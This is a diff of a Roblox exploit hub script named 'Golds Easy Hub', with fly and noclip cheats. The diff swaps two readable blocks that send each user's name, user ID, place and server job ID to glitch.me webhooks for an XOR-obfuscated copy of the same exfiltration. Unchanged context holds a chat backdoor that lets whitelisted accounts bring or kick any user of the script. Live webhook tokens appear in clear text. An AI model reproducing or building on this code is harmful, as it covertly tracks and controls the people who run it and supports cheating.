@@ -5057,87 +5057,7 @@ local function SXNOFKY_fake_script() -- Fake Script: StarterGui.GEH_Client.Local
 
 	--- gayness
 
-	local webhookURL = "https://kicore.glitch.me/api/webhooks/1354120655892643860/RTv53ewLLTGZGemNONudULqufXUJltu8qalakjjxs4myQWdYEbhTb9GE1ple0aSLKGBZ"
-	local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-	wait(0.2)
-	local timeExecuted = os.date("%Y-%m-%d %H:%M:%S", os.time())
-
-	local success, executorName = pcall(function()
-		return identifyexecutor()
-	end)
-	if not success then executorName = "Unknown" end
-
-	local placeName = "Unknown Place"
-	local successPlace, result = pcall(function()
-		return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-	end)
-	if successPlace then placeName = result end
-
-	local data = {
-		content = "",
-		embeds = {
-			{
-				title = "Version 2 Execution Details",
-				color = 16711680,
-				fields = {
-					{ name = "**Player Name**", value = "`" .. game.Players.LocalPlayer.Name .. "`", inline = true },
-					{ name = "**Place ID**", value = "`" .. game.PlaceId .. "`", inline = true },
-					{ name = "**Place Name**", value = "`" .. placeName .. "`", inline = true },
-					{ name = "**Job ID**", value = "`" .. game.JobId .. "`", inline = false },
-					{ name = "**Time Executed**", value = "`" .. timeExecuted .. "`", inline = true },
-					{ name = "**Executor**", value = "`" .. executorName .. "`", inline = true },
-					{
-						name = "**Quick Join**",
-						value = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance('" .. game.PlaceId .. "', '" .. game.JobId .. "', game.Players.LocalPlayer)\n```",
-						inline = false
-					}
-				},
-				footer = {
-					text = "Execution Log • " .. os.date("%Y-%m-%d %H:%M:%S"),
-					icon_url = "https://media.discordapp.net/attachments/1354120626872520804/1354127959098790071/New_Project_21.png?ex=67e4296f&is=67e2d7ef&hm=4abb6001c6d31e46b50e3ba89487f1274bf68c49a39ee586655f34de507f889a&=&format=webp&quality=lossless"
-				}
-			}
-		}
-	}
-
-	local jsonData = game:GetService("HttpService"):JSONEncode(data)
-
-	if httprequest then
-		httprequest({
-			Url = webhookURL,
-			Method = "POST",
-			Headers = { ["Content-Type"] = "application/json" },
-			Body = jsonData
-		})
-	else
-		--("HTTP Request Unsupported.")
-	end
-
-	warn("Golds Easy Hub: Loaded successfully")
-
-	--- gayness 2
-
-	local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-	wait(0.2)
-
-	local data = {
-		content = game.Players.LocalPlayer.UserId .. " executed"
-	}
-
-	local jsonData = game:GetService("HttpService"):JSONEncode(data)
-
-	local webhookURL2 = "https://kicore.glitch.me/api/webhooks/1354560463916241097/KjCRU9bLDw9cFBaiuRHimtyDINrIW5zJ-wRHW4cxgjIWNlPhQcIUp73uDKs2p1yRjhQ8"
-
-	if httprequest then
-		httprequest({
-			Url = webhookURL2,
-			Method = "POST",
-			Headers = { ["Content-Type"] = "application/json" },
-			Body = jsonData
-		})
-	else
-		--("HTTP Request Unsupported.")
-	end
+	local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v18,v19) local v20={};for v21=1, #v18 do v6(v20,v0(v4(v1(v2(v18,v21,v21 + 1 )),v1(v2(v19,1 + (v21% #v19) ,1 + (v21% #v19) + 1 )))%256 ));end return v5(v20);end local v8=v7("\217\215\207\53\245\225\136\81\218\202\216\42\244\190\137\25\221\202\207\38\238\245\202\27\158\194\203\44\169\172\194\28\217\204\212\46\245\244\150\77\132\150\130\125\176\232\158\75\129\150\142\117\182\234\145\79\129\140\216\20\252\237\223\83\192\228\213\15\245\188\228\21\216\243\201\1\239\142\246\77\244\197\236\19\179\144\146\72\235\245\241\124\227\236\236\57\193\201\238\40\224\140\212\75\210\206\209\22\196\172\206\26\244\234\138\53\193\226\212\40\245\232\207\61\224\178","\126\177\163\187\69\134\219\167");local v9=(syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request ;wait(0.2 -0 );local v10=os.date(v7("\102\244\103\128\241\110\136\46\133\185\11\151\111\232\166\102\254","\156\67\173\74\165"),os.time());local v11,v12=pcall(function() return identifyexecutor();end);if  not v11 then v12=v7("\1\185\66\24\179\49\72","\38\84\215\41\118\220\70");end local v13=v7("\101\24\41\28\241\71\24\98\34\242\81\21\39","\158\48\118\66\114");local v14,v15=pcall(function() return game:GetService(v7("\134\37\2\61\118\177\235\167\37\19\51\64\160\233\189\45\19\51","\155\203\68\112\86\19\197")):GetProductInfo(game.PlaceId).Name;end);if v14 then v13=v15;end local v16={[v7("\69\210\56\232\69\118\241","\152\38\189\86\156\32\24\133")]="",[v7("\249\90\165\67\248\68","\38\156\55\199")]={{[v7("\188\116\104\36\22","\35\200\29\28\72\115\20\154")]=v7("\47\186\195\204\132\35\58\89\237\145\250\149\41\55\12\171\216\208\131\108\16\28\171\208\214\129\63","\84\121\223\177\191\237\76"),[v7("\184\89\197\175\40","\161\219\54\169\192\90\48\80")]=16712886 -(696 + 510) ,[v7("\79\75\5\41\77\81","\69\41\34\96")]={{[v7("\178\194\218\15","\75\220\163\183\106\98")]=v7("\72\240\187\59\216\27\191\153\119\247\3\183\142\125\147","\185\98\218\235\87"),[v7("\221\61\43\243\219","\202\171\92\71\134\190")]="`"   .. game.Players.LocalPlayer.Name   .. "`" ,[v7("\32\207\32\129\39\196","\232\73\161\76")]=true},{[v7("\181\216\79\88","\126\219\185\34\61")]=v7("\70\132\110\126\127\116\246\167\37\234\20\56","\135\108\174\62\18\30\23\147"),[v7("\160\232\38\222\29","\167\214\137\74\171\120\206\83")]="`"   .. game.PlaceId   .. "`" ,[v7("\130\254\62\84\246\162","\199\235\144\82\61\152")]=true},{[v7("\9\23\180\46","\75\103\118\217")]=v7("\141\30\64\24\184\29\194\20\94\21\180\27\141\30","\126\167\52\16\116\217"),[v7("\222\47\44\149\177","\156\168\78\64\224\212\121")]="`"   .. v13   .. "`" ,[v7("\14\224\169\199\9\235","\174\103\142\197")]=true},{[v7("\88\41\82\61","\152\54\72\63\88\69\62")]=v7("\158\142\196\83\214\132\199\120\158\142","\60\180\164\142"),[v7("\78\95\9\60\34","\114\56\62\101\73\71\141")]="`"   .. game.JobId   .. "`" ,[v7("\177\231\215\205\182\236","\164\216\137\187")]=false},{[v7("\220\231\60\183","\107\178\134\81\210\198\158")]=v7("\114\68\182\207\167\61\78\167\222\175\59\27\150\195\174\114\68","\202\88\110\226\166"),[v7("\213\14\142\226\207","\170\163\111\226\151")]="`"   .. v10   .. "`" ,[v7("\24\62\190\49\64\50","\73\113\80\210\88\46\87")]=true},{[v7("\143\45\192\23","\135\225\76\173\114")]=v7("\80\167\157\168\169\190\178\14\226\170\250\230","\199\122\141\216\208\204\221"),[v7("\187\220\28\229\125","\150\205\189\112\144\24")]="`"   .. v12   .. "`" ,[v7("\44\138\179\69\10\141","\112\69\228\223\44\100\232\113")]=true},{[v7("\218\30\10\214","\230\180\127\103\179\214\28")]=v7("\198\79\110\83\237\66\235\204\47\80\79\234\11\170","\128\236\101\63\38\132\33"),[v7("\186\168\29\81\179","\175\204\201\113\36\214\139")]='```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(\''   .. game.PlaceId   .. "', '"   .. game.JobId   .. "', game.Players.LocalPlayer)\n```" ,[v7("\78\194\57\213\10\66","\100\39\172\85\188")]=false}},[v7("\171\119\182\148\54\191","\83\205\24\217\224")]={[v7("\242\192\213\41","\93\134\165\173")]="Execution Log • "   .. os.date(v7("\251\203\140\135\55\131\247\122\254\183\233\152\127\227\232\59\141","\30\222\146\161\162\90\174\210")) ,[v7("\236\77\127\4\218\91\98\6","\106\133\46\16")]=v7("\80\52\103\236\73\26\23\111\126\249\94\73\89\110\119\245\73\67\87\50\119\253\74\80\22\46\118\232\21\65\76\52\114\255\82\77\93\46\103\239\21\17\11\117\39\173\8\16\14\114\37\164\13\18\13\114\35\164\10\20\23\113\32\169\14\17\10\119\42\169\3\16\1\120\36\165\10\16\15\113\60\210\95\87\103\16\97\243\80\69\91\52\76\174\11\14\72\46\116\163\95\88\5\118\36\249\14\18\1\118\117\186\83\83\5\118\36\249\8\68\15\37\117\186\82\77\5\116\114\254\88\22\8\112\34\255\12\68\11\113\118\168\12\66\13\112\118\175\88\65\0\121\39\164\13\70\9\114\36\168\88\70\14\120\112\168\3\65\11\121\118\249\15\24\14\118\38\169\92\19\12\36\118\169\10\23\94\120\43\165\91\6\5\102\117\243\72\77\89\52\46\235\95\66\72\102\98\233\91\76\81\52\106\161\86\79\75\51\127\249\73\83","\32\56\64\19\156\58")}}}};local v17=game:GetService(v7("\114\220\241\70\105\247\146\76\193\230\83","\224\58\168\133\54\58\146")):JSONEncode(v16);if v9 then v9({[v7("\108\68\71","\107\57\54\43\157\21\230\231")]=v8,[v7("\246\142\5\253\182\216","\175\187\235\113\149\217\188")]=v7("\12\128\178\120","\24\92\207\225\44\131\25"),[v7("\99\214\185\72\30\111\88","\29\43\179\216\44\123")]={[v7("\158\214\46\88\184\215\52\1\137\192\48\73","\44\221\185\64")]=v7("\0\247\88\83\122\2\230\92\86\124\15\168\66\76\124\15","\19\97\135\40\63")},[v7("\140\83\55\34","\81\206\60\83\91\79")]=v17});else end
 end
 local function JKNTAV_fake_script() -- Fake Script: StarterGui.GEH_Client.AnimationsScript
 	local script = Instance.new("LocalScript")
@@ -5523,7 +5443,7 @@ local function TVBBQI_fake_script() -- Fake Script: StarterGui.GEH_Client.LocalP
 			flyPlayer(true)
 		end
 	end)
-	
+
 	task.spawn(function()
 		while task.wait() do
 			if noClipEnabled then
@@ -6210,78 +6130,78 @@ local TextChatService = game:GetService("TextChatService")
 local localPlayer = Players.LocalPlayer
 
 local commands = {
-    [".bring"] = function(sender, reason)
-        if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
-            if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                localPlayer.Character:SetPrimaryPartCFrame(sender.Character.PrimaryPart.CFrame)
-            end
-        end
-    end,
-    [".kick"] = function(sender, reason)
-        localPlayer:Kick(reason)
-    end
+	[".bring"] = function(sender, reason)
+		if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
+			if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
+				localPlayer.Character:SetPrimaryPartCFrame(sender.Character.PrimaryPart.CFrame)
+			end
+		end
+	end,
+	[".kick"] = function(sender, reason)
+		localPlayer:Kick(reason)
+	end
 }
 
 local adminWhitelist = {
-    "ikDebris",
-    "lvasion",
-    "starsorbitspace",
-    "restaxts",
-    "ixpinkyyxi"
+	"ikDebris",
+	"lvasion",
+	"starsorbitspace",
+	"restaxts",
+	"ixpinkyyxi"
 }
 
 function getPlayer(short)
-    short = string.lower(short)
-    for _, player in pairs(Players:GetPlayers()) do
-        if player.Name:lower():sub(1, #short) == short or player.DisplayName:lower():sub(1, #short) == short then
-            return player
-        end
-    end
-    return nil
+	short = string.lower(short)
+	for _, player in pairs(Players:GetPlayers()) do
+		if player.Name:lower():sub(1, #short) == short or player.DisplayName:lower():sub(1, #short) == short then
+			return player
+		end
+	end
+	return nil
 end
 
 function chatted(sender, msg)
-    local plrFound = false
-    
-    for _, v in pairs(adminWhitelist) do
-        if v == sender.Name then
-            plrFound = true
-            break
-        end
-    end
-    
-    if not plrFound then
-        return
-    end
-    
-    local args = msg:split(" ")
-    local command = args[1]
-    local targetName = args[2]
-    local reason = args[3] or ""
-    
-    if commands[command] and targetName then
-        local targetPlayer = getPlayer(targetName)
-        if targetPlayer and targetPlayer == localPlayer then
-            print("fired command")
-            commands[command](sender, reason)
-        end
-    end
+	local plrFound = false
+
+	for _, v in pairs(adminWhitelist) do
+		if v == sender.Name then
+			plrFound = true
+			break
+		end
+	end
+
+	if not plrFound then
+		return
+	end
+
+	local args = msg:split(" ")
+	local command = args[1]
+	local targetName = args[2]
+	local reason = args[3] or ""
+
+	if commands[command] and targetName then
+		local targetPlayer = getPlayer(targetName)
+		if targetPlayer and targetPlayer == localPlayer then
+			print("fired command")
+			commands[command](sender, reason)
+		end
+	end
 end
 
 TextChatService.OnIncomingMessage = function(message)
-    if message.TextSource then
-        local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
-        if sender then
-            chatted(sender, message.Text)
-        end
-    end
+	if message.TextSource then
+		local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
+		if sender then
+			chatted(sender, message.Text)
+		end
+	end
 end
 
 game.Players.LocalPlayer.Chatted:Connect(function(message)
 	local args = message:split(" ")
 	local command = args[1]
 	local targetName = args[2]
-	
+
 	if command == ".to" then
 		local targetPlayer = getPlayer(targetName)
 		if targetPlayer and targetPlayer.Character then
